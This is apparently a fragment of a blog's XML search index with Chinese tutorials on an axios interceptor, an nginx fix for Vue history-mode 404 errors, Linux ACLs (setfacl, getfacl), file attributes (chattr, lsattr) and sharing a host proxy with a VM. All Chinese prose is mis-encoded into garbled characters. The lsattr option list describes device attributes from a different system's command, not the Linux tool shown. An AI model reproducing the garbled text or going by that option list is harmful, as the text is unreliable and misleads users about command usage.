class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data === <span class="string">&#x27;string&#x27;</span> &amp;&amp; data.startsWith(<span class="string">&#x27;&#123;&#x27;</span>)) &#123;</span><br><span class="line">      data = <span class="built_in">JSON</span>.parse(data)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯·æ±‚æ‹¦æˆªå™¨</span></span><br><span class="line">service.interceptors.request.use(<span class="function">(<span class="params">config: AxiosRequestConfig</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// é”™è¯¯æŠ›åˆ°ä¸šåŠ¡ä»£ç </span></span><br><span class="line">    error.data = &#123;&#125;</span><br><span class="line">    error.data.msg = <span class="string">&#x27;æœåŠ¡å™¨å¼‚å¸¸ï¼Œè¯·è”ç³»ç®¡ç†å‘˜ï¼&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å“åº”æ‹¦æˆªå™¨</span></span><br><span class="line">service.interceptors.response.use(<span class="function">(<span class="params">response: AxiosResponse</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> status = response.status</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (status &lt; <span class="number">200</span> || status &gt;= <span class="number">300</span>) &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†httpé”™è¯¯ï¼ŒæŠ›åˆ°ä¸šåŠ¡ä»£ç </span></span><br><span class="line">        msg = showStatus(status)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> response.data === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            response.data = &#123;msg&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.data.msg = msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// é”™è¯¯æŠ›åˆ°ä¸šåŠ¡ä»£ç </span></span><br><span class="line">    error.data = &#123;&#125;</span><br><span class="line">    error.data.msg = <span class="string">&#x27;è¯·æ±‚è¶…æ—¶æˆ–æœåŠ¡å™¨å¼‚å¸¸ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæˆ–è”ç³»ç®¡ç†å‘˜ï¼&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> service</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx æœåŠ¡éƒ¨ç½² Vue é¡¹ç›®å,å‡ºç° 404 é—®é¢˜</title>
      <link href="post/59640/"/>
      <url>post/59640/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨æœ¬åœ°ä¸éƒ¨ç½²çº¿ä¸Šç¯å¢ƒåéƒ½æ²¡æœ‰é—®é¢˜ï¼Œä½¿ç”¨â€˜historyâ€™è·¯ç”±æ¨¡å¼ï¼Œéƒ¨ç½²çº¿ä¸Šç¯å¢ƒåï¼Œé¦–é¡µèƒ½æ­£å¸¸è®¿é—®ï¼Œç‚¹å‡»å…¶ä»–é¡µé¢ï¼Œå‡ºç° 404 Not Found</p><span id="more"></span><h3 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h3><p>åˆ·æ–°é¡µé¢æ—¶è®¿é—®çš„èµ„æºåœ¨æœåŠ¡ç«¯æ‰¾ä¸åˆ°ï¼Œå› ä¸ºæ­¤æ—¶vue-routerè®¾ç½®è·¯ç”±åœ°å€è¢«å½“ä½œurlåœ°å€ï¼Œæ­¤æ—¶çš„åœ°å€è·¯å¾„ä¸æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œæ‰€ä»¥å‡ºç°404ç°è±¡</p><p>åœ¨æœåŠ¡ç«¯nginxé…ç½®é‡Œæ·»åŠ vue-routeçš„è·³è½¬è®¾ç½®ï¼ˆè¿™é‡Œé¦–é¡µæ˜¯index.htmlï¼Œå¦‚æœæ˜¯index.phpå°±åœ¨ä¸‹é¢å¯¹åº”ä½ç½®æ›¿æ¢ï¼‰ï¼Œé…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    server_name www.test.com;</span><br><span class="line">    <span class="keyword">index</span> <span class="keyword">index</span>.php <span class="keyword">index</span>.html <span class="keyword">index</span>.htm <span class="keyword">default</span>.php <span class="keyword">default</span>.htm <span class="keyword">default</span>.html;</span><br><span class="line">    root /www/wwwroot/test/dist;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#vue-routeré…ç½®</span></span><br><span class="line">    <span class="keyword">location</span> / &#123;</span><br><span class="line">        try_files $uri $uri/ @router;</span><br><span class="line">        <span class="keyword">index</span> <span class="keyword">index</span>.html;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">location</span> @router &#123;</span><br><span class="line">        rewrite ^.*$ /<span class="keyword">index</span>.html last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡å¯ nginx åï¼Œé¡µé¢å¯ä»¥æ­£å¸¸è®¿é—®</p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxæ–‡ä»¶è®¿é—®æ§åˆ¶åˆ—è¡¨</title>
      <link href="post/36849/"/>
      <url>post/36849/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å¦‚æœå¸Œæœ›å¯¹æŸä¸ªæŒ‡å®šçš„ç”¨æˆ·è¿›è¡Œå•ç‹¬çš„æƒé™æ§åˆ¶ï¼Œå°±éœ€è¦ç”¨åˆ°æ–‡ä»¶çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰äº†ã€‚é€šä¿—æ¥è®²ï¼ŒåŸºäºæ™®é€šæ–‡ä»¶æˆ–ç›®å½•è®¾ç½®ACLå…¶å®å°±æ˜¯é’ˆå¯¹æŒ‡å®šçš„ç”¨æˆ·æˆ–ç”¨æˆ·ç»„è®¾ç½®æ–‡ä»¶æˆ–ç›®å½•çš„æ“ä½œæƒé™ã€‚å¦å¤–ï¼Œå¦‚æœé’ˆå¯¹æŸä¸ªç›®å½•è®¾ç½®äº†ACLï¼Œåˆ™ç›®å½•ä¸­çš„æ–‡ä»¶ä¼šç»§æ‰¿å…¶ACLï¼›è‹¥é’ˆå¯¹æ–‡ä»¶è®¾ç½®äº†ACLï¼Œåˆ™æ–‡ä»¶ä¸å†ç»§æ‰¿å…¶æ‰€åœ¨ç›®å½•çš„ACLã€‚</p><span id="more"></span><h3 id="setfacl-å‘½ä»¤"><a href="#setfacl-å‘½ä»¤" class="headerlink" title="setfacl å‘½ä»¤"></a>setfacl å‘½ä»¤</h3><p>setfaclå‘½ä»¤ç”¨äºç®¡ç†æ–‡ä»¶çš„ACLè§„åˆ™ï¼Œæ ¼å¼ä¸ºâ€œsetfacl [å‚æ•°] æ–‡ä»¶åç§°â€ã€‚</p><p>æ–‡ä»¶çš„ACLæä¾›çš„æ˜¯åœ¨æ‰€æœ‰è€…ã€æ‰€å±ç»„ã€å…¶ä»–äººçš„è¯»/å†™/æ‰§è¡Œæƒé™ä¹‹å¤–çš„ç‰¹æ®Šæƒé™æ§åˆ¶ï¼Œä½¿ç”¨setfaclå‘½ä»¤å¯ä»¥é’ˆå¯¹å•ä¸€ç”¨æˆ·æˆ–ç”¨æˆ·ç»„ã€å•ä¸€æ–‡ä»¶æˆ–ç›®å½•æ¥è¿›è¡Œè¯»/å†™/æ‰§è¡Œæƒé™çš„æ§åˆ¶ã€‚</p><p>å…¶ä¸­ï¼Œé’ˆå¯¹ç›®å½•æ–‡ä»¶éœ€è¦ä½¿ç”¨-Ré€’å½’å‚æ•°ï¼›é’ˆå¯¹æ™®é€šæ–‡ä»¶åˆ™ä½¿ç”¨-må‚æ•°ï¼›å¦‚æœæƒ³è¦åˆ é™¤æŸä¸ªæ–‡ä»¶çš„ACLï¼Œåˆ™å¯ä»¥ä½¿ç”¨-bå‚æ•°ã€‚</p><p>è®¾ç½®ç”¨æˆ·åœ¨/rootç›®å½•ä¸Šçš„æƒé™ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="comment"># setfacl -Rm u:linuxprobe:rwx /root</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># su - linuxprobe</span></span><br><span class="line">Last login: Sat Mar <span class="number">21</span> <span class="number">15</span>:<span class="number">45</span>:<span class="number">03</span> CST <span class="number">2017</span> on pts/<span class="number">1</span></span><br><span class="line">[linuxprobe@linuxprobe ~]$ cd /root</span><br><span class="line">[linuxprobe@linuxprobe root]$ ls</span><br><span class="line">anaconda-ks.cfg Downloads Pictures Public</span><br><span class="line">[linuxprobe@linuxprobe root]$ cat anaconda-ks.cfg</span><br><span class="line">[linuxprobe@linuxprobe root]$ <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>å¸¸ç”¨çš„lså‘½ä»¤æ˜¯çœ‹ä¸åˆ°ACLè¡¨ä¿¡æ¯çš„ï¼Œä½†æ˜¯å´å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„æƒé™æœ€åä¸€ä¸ªç‚¹ï¼ˆ.ï¼‰å˜æˆäº†åŠ å·ï¼ˆ+ï¼‰,è¿™å°±æ„å‘³ç€è¯¥æ–‡ä»¶å·²ç»è®¾ç½®äº†ACLäº†ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="comment"># ls -ld /root</span></span><br><span class="line">dr-xrwx---+<span class="number"> 14 </span>root root<span class="number"> 4096 </span>May<span class="number"> 4 </span>2017 /root</span><br></pre></td></tr></table></figure><h3 id="getfacl-å‘½ä»¤"><a href="#getfacl-å‘½ä»¤" class="headerlink" title="getfacl å‘½ä»¤"></a>getfacl å‘½ä»¤</h3><p>getfaclå‘½ä»¤ç”¨äºæ˜¾ç¤ºæ–‡ä»¶ä¸Šè®¾ç½®çš„ACLä¿¡æ¯ï¼Œæ ¼å¼ä¸ºâ€œgetfacl æ–‡ä»¶åç§°â€ã€‚</p><p>æƒ³è¦è®¾ç½®ACLï¼Œç”¨çš„æ˜¯setfaclå‘½ä»¤ï¼›è¦æƒ³æŸ¥çœ‹ACLï¼Œåˆ™ç”¨çš„æ˜¯getfaclå‘½ä»¤ã€‚</p><p>ä½¿ç”¨getfaclå‘½ä»¤æ˜¾ç¤ºåœ¨rootç®¡ç†å‘˜å®¶ç›®å½•ä¸Šè®¾ç½®çš„æ‰€æœ‰ACLä¿¡æ¯ã€‚</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="meta"># getfacl /root</span></span><br><span class="line"><span class="symbol">getfacl:</span> Removing leading <span class="string">&#x27;/&#x27;</span> from absolute path names</span><br><span class="line"><span class="meta"># file: root</span></span><br><span class="line"><span class="meta"># owner: root</span></span><br><span class="line"><span class="meta"># group: root</span></span><br><span class="line"><span class="symbol">user:</span>:r-<span class="built_in">x</span></span><br><span class="line"><span class="symbol">user:</span>linuxprobe:rwx</span><br><span class="line"><span class="symbol">group:</span>:r-<span class="built_in">x</span></span><br><span class="line"><span class="symbol">mask:</span>:rwx</span><br><span class="line"><span class="symbol">other:</span>:---</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxæ–‡ä»¶çš„éšè—å±æ€§</title>
      <link href="post/1747/"/>
      <url>post/1747/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Linuxç³»ç»Ÿä¸­çš„æ–‡ä»¶é™¤äº†å…·å¤‡ä¸€èˆ¬æƒé™å’Œç‰¹æ®Šæƒé™ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§éšè—æƒé™ï¼Œå³è¢«éšè—èµ·æ¥çš„æƒé™ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸èƒ½ç›´æ¥è¢«ç”¨æˆ·å‘è§‰ã€‚æ˜æ˜æƒé™å……è¶³ä½†å´æ— æ³•åˆ é™¤æŸä¸ªæ–‡ä»¶çš„æƒ…å†µï¼Œæˆ–è€…ä»…èƒ½åœ¨æ—¥å¿—æ–‡ä»¶ä¸­è¿½åŠ å†…å®¹è€Œä¸èƒ½ä¿®æ”¹æˆ–åˆ é™¤å†…å®¹ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜»æ­¢äº†é»‘å®¢ç¯¡æ”¹ç³»ç»Ÿæ—¥å¿—çš„å›¾è°‹ï¼Œå› æ­¤è¿™ç§â€œå¥‡æ€ªâ€çš„æ–‡ä»¶ä¹Ÿä¿éšœäº†Linuxç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p><span id="more"></span><h3 id="chattr-å‘½ä»¤"><a href="#chattr-å‘½ä»¤" class="headerlink" title="chattr å‘½ä»¤"></a>chattr å‘½ä»¤</h3><p>chattrå‘½ä»¤ç”¨äºè®¾ç½®æ–‡ä»¶çš„éšè—æƒé™ï¼Œæ ¼å¼ä¸ºâ€œchattr [å‚æ•°] æ–‡ä»¶â€ã€‚å¦‚æœæƒ³è¦æŠŠæŸä¸ªéšè—åŠŸèƒ½æ·»åŠ åˆ°æ–‡ä»¶ä¸Šï¼Œåˆ™éœ€è¦åœ¨å‘½ä»¤åé¢è¿½åŠ â€œ+å‚æ•°â€ï¼Œå¦‚æœæƒ³è¦æŠŠæŸä¸ªéšè—åŠŸèƒ½ç§»å‡ºæ–‡ä»¶ï¼Œåˆ™éœ€è¦è¿½åŠ â€œ-å‚æ•°â€</p><p>å…±æœ‰ä»¥ä¸‹8ç§æ¨¡å¼ï¼š</p><ul><li>aï¼šè®©æ–‡ä»¶æˆ–ç›®å½•ä»…ä¾›é™„åŠ ç”¨é€”ï¼›</li><li>bï¼šä¸æ›´æ–°æ–‡ä»¶æˆ–ç›®å½•çš„æœ€åå­˜å–æ—¶é—´ï¼›</li><li>cï¼šå°†æ–‡ä»¶æˆ–ç›®å½•å‹ç¼©åå­˜æ”¾ï¼›</li><li>dï¼šå°†æ–‡ä»¶æˆ–ç›®å½•æ’é™¤åœ¨å€¾å€’æ“ä½œä¹‹å¤–ï¼›</li><li>iï¼šä¸å¾—ä»»æ„æ›´åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼›</li><li>sï¼šä¿å¯†æ€§åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼›</li><li>Sï¼šå³æ—¶æ›´æ–°æ–‡ä»¶æˆ–ç›®å½•ï¼›</li><li>uï¼šé¢„é˜²æ„å¤–åˆ é™¤ã€‚</li></ul><p>é€‰é¡¹ï¼š</p><ul><li>-Rï¼šé€’å½’å¤„ç†ï¼Œå°†æŒ‡ä»¤ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†ï¼›</li><li>-v&lt;ç‰ˆæœ¬ç¼–å·&gt;ï¼šè®¾ç½®æ–‡ä»¶æˆ–ç›®å½•ç‰ˆæœ¬ï¼›</li><li>-Vï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›</li><li>+&lt;å±æ€§&gt;ï¼šå¼€å¯æ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ï¼›</li><li>-&lt;å±æ€§&gt;ï¼šå…³é—­æ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ï¼›</li><li>=&lt;å±æ€§&gt;ï¼šæŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ã€‚</li></ul><p>æ–°å»ºä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œå¹¶ä¸ºå…¶è®¾ç½®ä¸å…è®¸åˆ é™¤ä¸è¦†ç›–ï¼ˆ+aå‚æ•°ï¼‰æƒé™ï¼Œç„¶åå†å°è¯•å°†è¿™ä¸ªæ–‡ä»¶åˆ é™¤ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">root@linuxprobe ~</span>]<span class="meta"># echo &quot;for Test&quot; &gt; linuxprobe</span></span><br><span class="line">[<span class="meta">root@linuxprobe ~</span>]<span class="meta"># chattr +a linuxprobe</span></span><br><span class="line">[<span class="meta">root@linuxprobe ~</span>]<span class="meta"># rm linuxprobe</span></span><br><span class="line">rm: <span class="keyword">remove</span> regular file â€˜linuxprobeâ€™? y</span><br><span class="line">rm: cannot <span class="keyword">remove</span> â€˜linuxprobeâ€™: Operation <span class="keyword">not</span> permitted</span><br></pre></td></tr></table></figure><h3 id="lsattr-å‘½ä»¤"><a href="#lsattr-å‘½ä»¤" class="headerlink" title="lsattr å‘½ä»¤"></a>lsattr å‘½ä»¤</h3><p>lsattrå‘½ä»¤ç”¨äºæ˜¾ç¤ºæ–‡ä»¶çš„éšè—æƒé™ï¼Œæ ¼å¼ä¸ºâ€œlsattr [å‚æ•°] æ–‡ä»¶â€ã€‚</p><ul><li>-Eï¼šå¯æ˜¾ç¤ºè®¾å¤‡å±æ€§çš„å½“å‰å€¼ï¼Œä½†è¿™ä¸ªå½“å‰å€¼æ˜¯ä»ç”¨æˆ·è®¾å¤‡æ•°æ®åº“ä¸­è·å¾—çš„ï¼Œè€Œä¸æ˜¯ä»è®¾å¤‡ç›´æ¥è·å¾—çš„ã€‚</li><li>-Dï¼šæ˜¾ç¤ºå±æ€§çš„åç§°ï¼Œå±æ€§çš„é»˜è®¤å€¼ï¼Œæè¿°å’Œç”¨æˆ·æ˜¯å¦å¯ä»¥ä¿®æ”¹å±æ€§å€¼çš„æ ‡å¿—ã€‚</li><li>-Rï¼šé€’å½’çš„æ“ä½œæ–¹å¼ï¼›</li><li>-Vï¼šæ˜¾ç¤ºæŒ‡ä»¤çš„ç‰ˆæœ¬ä¿¡æ¯ï¼›</li><li>-aï¼šåˆ—å‡ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ã€‚</li></ul><p>lsattrç»å¸¸ä½¿ç”¨çš„å‡ ä¸ªé€‰é¡¹-Dï¼Œ-Eï¼Œ-Rè¿™ä¸‰ä¸ªé€‰é¡¹ä¸å¯ä»¥ä¸€èµ·ä½¿ç”¨ï¼Œå®ƒä»¬æ˜¯äº’æ–¥çš„ï¼Œç»å¸¸ä½¿ç”¨çš„è¿˜æœ‰-l,-Hï¼Œä½¿ç”¨lsattræ—¶ï¼Œå¿…é¡»æŒ‡å‡ºå…·ä½“çš„è®¾å¤‡åï¼Œç”¨-lé€‰é¡¹æŒ‡å‡ºè¦æ˜¾ç¤ºè®¾å¤‡çš„é€»è¾‘åç§°ï¼Œå¦åˆ™è¦ç”¨-cï¼Œ-sï¼Œ-tç­‰é€‰é¡¹å”¯ä¸€çš„ç¡®å®šæŸä¸ªå·²å­˜åœ¨çš„è®¾å¤‡ã€‚</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶çš„éšè—æƒé™å¿…é¡»ä½¿ç”¨lsattrå‘½ä»¤æ¥æŸ¥çœ‹ï¼Œå¹³æ—¶ä½¿ç”¨çš„lsä¹‹ç±»çš„å‘½ä»¤åˆ™çœ‹ä¸å‡ºç«¯å€ª</p><p>ä¸€æ—¦ä½¿ç”¨lsattrå‘½ä»¤åï¼Œæ–‡ä»¶ä¸Šè¢«èµ‹äºˆçš„éšè—æƒé™é©¬ä¸Šå°±ä¼šåŸå½¢æ¯•éœ²ã€‚æ­¤æ—¶å¯ä»¥æŒ‰ç…§æ˜¾ç¤ºçš„éšè—æƒé™çš„ç±»å‹ï¼ˆå­—æ¯ï¼‰ï¼Œä½¿ç”¨chattrå‘½ä»¤å°†å…¶å»æ‰ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="comment"># lsattr linuxprobe</span></span><br><span class="line"><span class="comment">-----a---------- linuxprobe</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># chattr -a linuxprobe</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># lsattr linuxprobe </span></span><br><span class="line"><span class="comment">---------------- linuxprobe</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># rm linuxprobe </span></span><br><span class="line">rm: remove regular <span class="built_in">file</span> â€˜linuxprobeâ€™? y</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Macè®¾ç½®è™šæ‹Ÿæœºä½¿ç”¨å®¿ä¸»æœºä»£ç†</title>
      <link href="post/24292/"/>
      <url>post/24292/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å‰æï¼šmac æœ¬èº«å·²ç»å®‰è£… ssï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ ss ç§‘å­¦ä¸Šç½‘ï¼ˆæˆ–è€… win ä¹Ÿä¸€æ ·ï¼‰<br>æƒ³è¦å®ç°ï¼šParallels Desktop é‡Œçš„è™šæ‹Ÿæœºä¹Ÿæƒ³ç§‘å­¦ä¸Šç½‘ï¼ˆæˆ–è€… win é‡Œå®‰è£… vmware ä¹Ÿä¸€æ ·ï¼Œæˆ–è€…æ˜¯å¦ä¸€å°ç‰©ç†æœºä¹Ÿæ˜¯ä¸€æ ·çš„ï¼‰</p><span id="more"></span><h3 id="æ–¹æ³•ä¸€ï¼šè™šæ‹Ÿæœºä¹Ÿå®‰è£…ä¸€ä¸ª-ss-å®¢æˆ·ç«¯"><a href="#æ–¹æ³•ä¸€ï¼šè™šæ‹Ÿæœºä¹Ÿå®‰è£…ä¸€ä¸ª-ss-å®¢æˆ·ç«¯" class="headerlink" title="æ–¹æ³•ä¸€ï¼šè™šæ‹Ÿæœºä¹Ÿå®‰è£…ä¸€ä¸ª ss å®¢æˆ·ç«¯"></a>æ–¹æ³•ä¸€ï¼šè™šæ‹Ÿæœºä¹Ÿå®‰è£…ä¸€ä¸ª ss å®¢æˆ·ç«¯</h3><p>å¯¹äºæœ‰çª—å£çš„ç³»ç»Ÿï¼Œæ¯”å¦‚ä½ è™šæ‹Ÿæœºé‡Œå®‰è£…çš„æ˜¯ winã€æˆ–è€… ubuntu ç­‰ï¼Œé‚£ä¹ˆå†å®‰è£…ä¸€ä¸ªå®¢æˆ·ç«¯æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œè¿™å°±ç›¸å½“äºåœ¨å¦ä¸€å°ç”µè„‘é‡Œä½¿ç”¨ ss å®¢æˆ·ç«¯ï¼Œæ—¢ç„¶ mac ä¸Šä½ ä¼šç”¨äº†ï¼Œé‚£åœ¨å…¶ä»–ç”µè„‘ä¸Šä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><p>ä½†æ˜¯å¦‚æœè™šæ‹Ÿæœºé‡Œæ˜¯æœ€å°åŒ–å®‰è£…çš„çº¯å‘½ä»¤è¡Œçš„ centosï¼Œé‚£ä¹ˆä½¿ç”¨å®¢æˆ·ç«¯å¯èƒ½æœ‰ä¸€å®šçš„éº»çƒ¦ï¼Œyum æ— æ³•å®‰è£…ï¼Œpip å®‰è£…çš„æ„Ÿè§‰ä¹Ÿæ˜¯ ssserverï¼Œå¹¶æ²¡æœ‰å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯è¿˜å¾—ç¼–è¯‘ï¼Œç¼–è¯‘è¿˜æœ‰å¾ˆå¤šä¾èµ–ï¼Œç¼–è¯‘å¥½è¿˜å¾—å†™å¯¹é…ç½®æ–‡ä»¶ï¼Œå¾ˆå¤šäººéƒ½ä¸å¤ªæ¸…æ¥šè¿™ä¸ªï¼Œæ‰€ä»¥è¿˜æ˜¯æŒºéº»çƒ¦çš„ã€‚</p><h3 id="æ–¹æ³•äºŒï¼šè™šæ‹Ÿæœºè®¾ç½®ä»£ç†åˆ°å®¿ä¸»æœº"><a href="#æ–¹æ³•äºŒï¼šè™šæ‹Ÿæœºè®¾ç½®ä»£ç†åˆ°å®¿ä¸»æœº" class="headerlink" title="æ–¹æ³•äºŒï¼šè™šæ‹Ÿæœºè®¾ç½®ä»£ç†åˆ°å®¿ä¸»æœº"></a>æ–¹æ³•äºŒï¼šè™šæ‹Ÿæœºè®¾ç½®ä»£ç†åˆ°å®¿ä¸»æœº</h3><p>å³è™šæ‹Ÿæœºé‡Œè®¾ç½®ä»£ç†åˆ° macï¼ˆè¿™é‡Œ mac å°±æ˜¯è™šæ‹Ÿæœºçš„å®¿ä¸»æœºï¼‰ï¼Œè®©è™šæ‹Ÿæœºé€šè¿‡ mac çš„ ss ç§‘å­¦ä¸Šç½‘ï¼Œè¿™é‡Œå¦‚æœå®¿ä¸»æœºæ¢æˆ winï¼Œè™šæ‹Ÿæœºè½¯ä»¶æ¢æˆ vmware æˆ– virtualboxï¼Œå®ƒçš„åŸç†ä¹Ÿéƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p><strong>è®¾ç½®æ–¹æ³•ï¼š</strong></p><p>1ã€é¦–å…ˆæŠŠå®¿ä¸»æœºçš„ ss è®¾ç½®é‡Œçš„ Local Socks5 Listen Address ç”±åŸæ¥çš„<code>127.0.0.1</code>è®¾ç½®ä¸º<code>0.0.0.0</code>ï¼Œå¦‚æœéœ€è¦é€šè¿‡ HTTP ä»£ç†ï¼Œé‚£ä¹ˆä¹Ÿè¦æŠŠ ss é‡Œçš„ HTTP é€‰é¡¹æ‰“å¼€ï¼Œå¹¶æŠŠ HTTP proxy Listen Address åœ°å€ç”±åŸæ¥çš„<code>127.0.0.1</code>è®¾ç½®ä¸º<code>0.0.0.0</code>ï¼Œè¿™æ ·åšè¡¨ç¤ºä»£ç†æ‰€æœ‰ ipï¼Œè€Œä¸åªæ˜¯æœ¬æœºçš„<code>127.0.0.1</code>ã€‚å¦‚æœç”¨çš„æ˜¯å…¶ä»–ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œä¹Ÿæœ‰äº›å†™æˆ â€œshare over LAN(é€šè¿‡å±€åŸŸç½‘å…±äº«)â€ï¼Œå¦‚æœæœ‰è¿™ä¸ªé€‰é¡¹ï¼Œé€‰ä¸Šäº†å°±è¡¨ç¤ºç›‘å¬<code>0.0.0.0</code>ã€‚</p><p>2ã€ææ¸…æ¥šè™šæ‹Ÿæœºæ˜¯é€šè¿‡ä»€ä¹ˆæ–¹å¼è”ç½‘çš„ï¼Œè™šæ‹Ÿæœºè¿ç½‘æ— éæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>  æ¡¥æ¥</li><li>  NAT</li></ul><p>å¦‚æœæ˜¯æ¡¥æ¥è¿ç½‘ï¼Œé‚£ä¹ˆåªè¦æ‰¾å‡ºå®¿ä¸»æœºçš„è”ç½‘ ip å³å¯ï¼ˆmac 